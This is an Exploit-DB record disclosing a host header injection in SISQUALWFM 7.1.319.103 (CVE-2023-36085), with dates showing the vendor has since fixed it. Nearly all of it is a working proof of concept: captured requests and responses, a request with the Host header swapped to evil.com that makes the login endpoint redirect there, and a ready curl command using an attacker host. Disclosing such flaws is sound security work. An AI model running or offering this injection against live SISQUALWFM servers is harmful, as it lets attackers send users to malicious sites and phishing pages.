{"source": "https://www.exploit-db.com/exploits/51796", "vulnName": "SISQUALWFM 7.1.319.103 - Host Header Injection", "vulnEDBID": "51796", "vulnCVE": "N/A", "author": "OMER SHAIK", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-02-15", "vulnContent": "# Exploit Title: SISQUALWFM 7.1.319.103 Host Header Injection\n# Discovered Date: 17/03/2023\n# Reported Date: 17/03/2023\n# Resolved Date: 13/10/2023\n# Exploit Author: Omer Shaik (unknown_exploit)\n# Vendor Homepage: https://www.sisqualwfm.com\n# Version: 7.1.319.103\n# Tested on: SISQUAL WFM 7.1.319.103\n# Affected Version: sisqualWFM - 7.1.319.103\n# Fixed Version: sisqualWFM - 7.1.319.111\n# CVE : CVE-2023-36085\n# CVSS: 3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N\n# Category: Web Apps\n\n\n\n\nA proof-of-concept(POC) scenario that demonstrates a potential host header injection vulnerability in sisqualWFM version 7.1.319.103, specifically targeting the /sisqualIdentityServer/core endpoint. This vulnerability could be exploited by an attacker to manipulate webpage links or redirect users to another site with ease, simply by tampering with the host header.\n\n****************************************************************************************************\nOrignal Request\n****************************************************************************************************\nGET /sisqualIdentityServer/core/login HTTP/2\nHost: sisqualwfm.cloud\nCookie:<cookie>\nSec-Ch-Ua: \"Not A(Brand\";v=\"24\", \"Chromium\";v=\"110\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Linux\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n****************************************************************************************************\nOrignal Response\n****************************************************************************************************\nHTTP/2 302 Found\nCache-Control: no-store, no-cache, must-revalidate\nLocation: https://sisqualwfm.cloud/sisqualIdentityServer/core/\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nX-Content-Type-Options: nosniff\nX-Frame-Options: sameorigin\nDate: Wed, 22 Mar 2023 13:22:10 GMT\nContent-Length: 0\n****************************************************************************************************\n\n\n\n\n\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\n\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551     \n\u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551     \n\u2588\u2588\u2551     \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n\u255a\u2550\u255d      \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d\n                \n\n\n\n****************************************************************************************************\nRequest has been modified to redirect user to evil.com (Intercepted request using Burp proxy)\n****************************************************************************************************\nGET /sisqualIdentityServer/core/login HTTP/2\nHost: evil.com\nCookie:<cookie>\nSec-Ch-Ua: \"Not A(Brand\";v=\"24\", \"Chromium\";v=\"110\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Linux\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n****************************************************************************************************\nResponse\n****************************************************************************************************\nHTTP/2 302 Found\nCache-Control: no-store, no-cache, must-revalidate\nLocation: https://evil.com/sisqualIdentityServer/core/\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nX-Content-Type-Options: nosniff\nX-Frame-Options: sameorigin\nContent-Length: 0\n\n\n****************************************************************************************************\nMethod of Attack\n****************************************************************************************************\n\ncurl -k --header \"Host: attack.host.com\" \"Domain Name + /sisqualIdentityServer/core\" -vvv\n\n****************************************************************************************************\n            "}